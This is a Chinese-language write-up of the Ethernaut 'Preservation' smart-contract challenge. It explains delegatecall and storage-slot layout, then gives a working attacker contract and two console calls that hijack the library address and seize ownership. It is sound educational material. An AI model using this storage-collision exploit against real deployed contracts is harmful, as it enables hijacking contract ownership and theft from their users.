## 0x01 Task

```javascript
pragma solidity ^0.4.23;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

## 0x02 Review

复习一下`delegatecall()`

![image-20200508213353951](https://picturefac.oss-cn-hangzhou.aliyuncs.com/img/20200508213355.png)

- `Delegate` call is a special, low level function call intended to invoke functions from another, often library, contract.
- If Contract A makes a `delegatecall` to Contract B, it allows Contract B to freely mutate its storage A, given Contract B’s *relative* storage reference pointers.
- 这就是说如果在合约A中`delegatecall`调用了合约B中的函数，并且我可以控制合约B的话，那我也可以修改合约A中的东西。

再复习一下合约的存储约定：

![image-20200508213627166](https://picturefac.oss-cn-hangzhou.aliyuncs.com/img/20200508213628.png)

- Ethereum allots 32-byte sized storage *slots* to store state. Slots start at index `0` and sequentially go up to 2²⁵⁶ slots.
- Basic datatypes are laid out contiguously in storage starting from position `0,` then `1`, until `2²⁵⁶-1`.
- If the **combined size** of sequentially declared data is **less than 32 bytes**, then the sequential data points are packed into a single storage slot to optimize space and gas.

结合`delegatecall`，理论上如果能把合约A和B的slots一一对应起来，就可以精准修改双方合约中的变量。

## 0x03 Solution

首先看源代码的下面片段：

```javascript
// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

```javascript
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
  }
```

我可以在console调用`setFirstTime`函数，来调用合约`LibraryContract`中的setTime，发现没有，我其实可以通过修改`LibraryContract`中的`storedTime`来修改`timeZone1Library`，因为它们在slot0上一一对应。

创建一个攻击合约：

```javascript
pragma solidity ^0.4.23;

contract BadLibraryContract {
    address public timeZone1Library; // SLOT 0
    address public timeZone2Library; // SLOT 1
    address public owner;            // SLOT 2
    uint storedTime;                 // SLOT 3

     function setTime(uint _time) public {
        owner = msg.sender;
    }
}
```

在console中，查看owner状态

```javascript
await contract.owner()
```

注意攻击合约中的`setTime`名字不要变动，因为在原代码中是写死的

```javascript
// Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
```

在console中进行两次调用就行：

`await contract.setFirstTime("[BadLibraryContract Addr]")`

`await contract.setFirstTime(1)`